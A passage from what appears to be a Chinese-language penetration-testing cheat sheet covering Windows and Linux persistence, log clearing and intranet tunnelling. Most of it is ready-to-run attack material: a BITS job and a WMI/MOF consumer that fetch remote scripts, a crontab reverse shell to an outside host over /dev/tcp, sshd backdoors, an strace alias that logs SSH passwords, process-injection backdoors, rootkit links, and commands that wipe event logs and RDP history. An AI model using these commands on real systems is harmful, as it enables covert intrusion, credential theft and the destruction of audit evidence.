class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure><h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure><h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure><h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure><h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof"></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP1&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 1&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D; &quot;GetObject(\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>管理员执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure><h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;BotFilter82\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure><h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#x27;Medium&#x27;)</span>]</span><br><span class="line">Param (</span><br><span class="line">[<span class="meta">Parameter(Mandatory = $True)</span>]</span><br><span class="line">[<span class="meta">ValidateNotNullOrEmpty()</span>]</span><br><span class="line">[<span class="meta">String</span>]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[<span class="meta">Switch</span>]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span></span><br><span class="line"><span class="keyword">if</span> ($Force -<span class="keyword">or</span> ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name <span class="string">&#x27;(default)&#x27;</span> -ErrorAction SilentlyContinue) -eq $<span class="literal">null</span>))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name <span class="string">&#x27;(Default)&#x27;</span> -Value $Command -PropertyType <span class="built_in">string</span> -Force | Out-Null</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Key already exists, consider using -Force&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Created registry entries to hijack the UserTask&quot;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Warning <span class="string">&quot;Failed to create registry key, exiting&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command <span class="string">&quot;C:\test\testmsg.dll&quot;</span> -Verbose</span><br></pre></td></tr></table></figure><h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure><p>后门触发：每次调用netsh</p><blockquote><p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p></blockquote><h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5><p>常用方式： InjectDll RedirectShortcut RedirectEXE</p><h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 </p><p>工具：<a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a> </p><p>工具：<a href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p><p>dll劫持不多说</p><h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent"></a>18、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent</a></h5><p>编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : <a href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p><h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe"></a>19、<a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe</a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : <a href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p><h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p><h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门 <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用VSTO实现的office后门</a> <a href="https://github.com/3gstudent/Office-Persistence">Office加载项</a></p><ul><li>Word WLL</li><li>Excel XLL</li><li>Excel VBA add-ins</li><li>PowerPoint VBA add-ins</li></ul><blockquote><p>参考1 ：<a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p></blockquote><blockquote><p>参考2 ：<a href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p></blockquote><h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序 POC:<a href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p><h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p><h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：<a href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p><h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure><h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载 Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p><h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧——“隐藏”注册表的创建》</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧——“隐藏”注册表的更多测试》</a></p><h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数 POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p><h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用BHO实现IE浏览器劫持</a></h5><h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure><p>链接：ssh <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#48;&#54;&#46;&#x31;&#x34;&#50;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x32;&#48;&#54;&#46;&#x31;&#x34;&#50;</a> -p 2333</p><h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure><h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39;</span><br></pre></td></tr></table></figure><p>source .bashrc</p><h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure><h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><ul><li><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li><li><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li><li>Mafix + Suterusu rootkit</li></ul><h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><ul><li><a href="https://github.com/Screetsec/Vegile">Vegile</a></li><li><a href="https://github.com/icco/backdoor">backdoor</a></li></ul><h1 id="14-痕迹清理"><a href="#14-痕迹清理" class="headerlink" title="14.痕迹清理"></a>14.痕迹清理</h1><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows日志清除</a></h3><p>获取日志分类列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure><p>获取单个日志类别的统计信息： eg.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure><p>查看指定日志的具体内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe &#x2F;f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><p>删除单个日志类别的所有信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具</p><ul><li><a href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li><li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li></ul><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs </span><br><span class="line">clearev </span><br></pre></td></tr></table></figure><h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; &#x2F;a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure><h1 id="15-内网穿透"><a href="#15-内网穿透" class="headerlink" title="15.内网穿透"></a>15.内网穿透</h1><p><strong>区分正向代理与反向代理</strong></p><p>A—-b—-C</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理</span><br><span class="line">B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理</span><br><span class="line">反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A</span><br></pre></td></tr></table></figure><h4 id="0x01-场景与思路分析"><a href="#0x01-场景与思路分析" class="headerlink" title="0x01 场景与思路分析"></a>0x01 场景与思路分析</h4><h6 id="场景一：内网防火墙对出口流量没有任何端口限制"><a href="#场景一：内网防火墙对出口流量没有任何端口限制" class="headerlink" title="场景一：内网防火墙对出口流量没有任何端口限制"></a>场景一：内网防火墙对出口流量没有任何端口限制</h6><p>思路 <strong>：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell</strong></p><h6 id="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）"><a href="#场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）" class="headerlink" title="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）"></a>场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</h6><p>思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</p><p><strong>方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</strong></p><p><strong>方法二：端口转发</strong></p><p><strong>方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网</strong></p><p>1.在内网主机上执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -p <span class="number">80</span> root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.230</span></span><br><span class="line">(输入外网主机的SSH口令)</span><br></pre></td></tr></table></figure><p>2.在外网主机上执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> -p <span class="number">2222</span> avfisher@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(输入内网主机的SSH口令)</span><br></pre></td></tr></table></figure><p>3.在外网主机上配置proxychains设置socks4代理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">[ProxyList]</span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>4.使用proxychains代理所有流量进入内网</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -nv <span class="number">10.0</span><span class="number">.2</span><span class="number">.5</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure><h6 id="场景三：TCP不出网-HTTP代理"><a href="#场景三：TCP不出网-HTTP代理" class="headerlink" 